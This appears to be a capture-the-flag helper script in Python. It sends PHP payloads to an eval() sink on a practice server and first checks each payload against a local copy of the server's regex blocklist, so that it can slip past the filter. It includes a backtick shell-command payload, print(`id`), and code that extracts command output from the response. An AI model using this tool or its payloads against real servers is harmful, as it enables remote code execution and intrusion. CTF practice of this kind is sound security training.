#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
One-shot payload sender for the 24112 eval() sink.

    python probe.py 'print(`id`);'
    python probe.py -f payload.txt
    echo 'print(1);' | python probe.py -

Prints the URL sent, the local regex replay verdict, the marker, and the raw
output (via backtick shell_exec when the payload uses backticks).
"""
import re
import sys
import urllib.request
import urllib.parse
import urllib.error

BASE = "http://node4.anna.nssctf.cn:24112/"
REGEX = r"sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\$|\*|\+|\^|scan|\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell"
RX = re.compile(REGEX, re.I)

OK_MARK = "看看你输入的参数！！！不叫样子！！"
BLOCK_MARK = "你想干什么？？？？？？？？？"
NOPARAM_MARK = "居然都不输入参数，可恶!!!!!!!!!"


def main():
    if len(sys.argv) > 2 and sys.argv[1] == "-f":
        with open(sys.argv[2], encoding="utf-8") as f:
            code = f.read().strip()
    elif len(sys.argv) > 1 and sys.argv[1] != "-":
        code = sys.argv[1]
    else:
        code = sys.stdin.read().strip()

    hit = RX.search(code)
    print("[payload] %r" % code)
    print("[local-replay] %s" % ("BANNED by %r" % hit.group(0) if hit else "clean"))
    if hit:
        print("[abort] the server regex would reject this; fix before sending")
        return 2

    qs = urllib.parse.urlencode({"code": code}, quote_via=urllib.parse.quote, safe="")
    url = BASE + "?" + qs
    print("[url] %s" % url)
    req = urllib.request.Request(url, headers={"User-Agent": "ctf-probe/1.0"})
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            body = r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        print("[exc] %r" % (e,))
        return 1

    if BLOCK_MARK in body:
        print("[marker] BLOCKED-BY-SERVER")
        return 3
    if OK_MARK in body:
        out = body.split(OK_MARK, 1)[1]
        for pre in ("<br>", "<br />", "<br/>"):
            if out.startswith(pre):
                out = out[len(pre):]
                break
        print("[marker] EVAL-OK")
        print("----8<---- output ----8<----")
        sys.stdout.write(out if out.endswith("\n") else out + "\n")
        print("---->8---- end    ---->8----")
        return 0
    if NOPARAM_MARK in body:
        print("[marker] NO-PARAM (source leak) len=%d" % len(body))
        return 0
    print("[marker] UNKNOWN len=%d" % len(body))
    print(body[:2000])
    return 0


if __name__ == "__main__":
    sys.exit(main())
